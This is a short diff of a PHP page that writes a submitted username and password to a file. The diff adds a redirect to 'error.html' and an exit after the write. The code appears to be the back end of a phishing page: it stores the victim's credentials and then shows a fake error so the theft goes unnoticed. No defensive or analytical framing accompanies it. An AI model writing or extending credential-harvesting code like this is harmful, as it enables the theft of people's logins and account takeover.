@@ -10,6 +10,11 @@
     fputs($myfic, $user);
     fputs($myfic, $user_password);
     fclose($myfic);
+
+    header("Location: error.html");
+	exit();
     ?>
+    
   </body>
+
 </html>
